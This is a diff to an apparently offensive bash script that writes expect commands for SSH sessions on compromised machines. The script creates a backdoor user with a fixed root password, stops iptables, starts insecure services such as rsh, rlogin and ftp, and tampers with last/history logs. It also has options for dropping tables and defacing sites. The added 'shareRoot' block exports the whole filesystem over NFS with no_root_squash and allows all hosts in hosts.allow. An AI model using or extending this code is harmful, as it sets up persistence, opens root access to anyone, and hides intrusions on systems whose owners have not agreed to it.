@@ -16,14 +16,14 @@ fi
 expectFile="connect.exp"
 errorFile=".evil_ssh.log"
 serviceStop="iptables"
-serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs smb smbd samba rsync rsh rlogin ftp"
+serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs nfslock rpcbind rpcidmapd smb smbd samba rsync rsh rlogin ftp"
 doServices="yes"
 newUser="sysd"
 newRootPass="Password!"
 newPass="Password!"
 dropTables="no"
 defaceSite="no"
-mountShare="no"
+shareRoot="no"
 alterLastHistory="yes"
 
 if [ $# -gt 0 ]; then
@@ -113,18 +113,22 @@ fi
 if [ "$doServices" == "yes" ]; then
 	for service in $serviceStart; do
 		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-		echo "send\"/usr/bin/env service $service start\r\" " >> $expectFile
+		echo "send \"/usr/bin/env service $service start\r\" " >> $expectFile
 	done
 
 	#stop certain services
 	for service in $serviceStop; do
 		echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-		echo "send\"/usr/bin/env service $service stop\r\" " >> $expectFile
+		echo "send \"/usr/bin/env service $service stop\r\" " >> $expectFile
 	done
 fi
 
-if [ "$mountShare" == "yes" ]; then
+if [ "$shareRoot" == "yes" ]; then
 	echo "Mounting remote share functionality not yet implemented"
+	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
+	echo "send \"echo \"/ *.*.*.*(rw,no_root_squash)\" >> /etc/exports\r\" " >> $expectFile
+	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
+	echo "send \"echo -e \"ALL:ALL\n\n\" >> /etc/hosts.allow\r\" " >> $expectFile
 fi
 
 if [ "$alterLastHistory" == "yes" ]; then
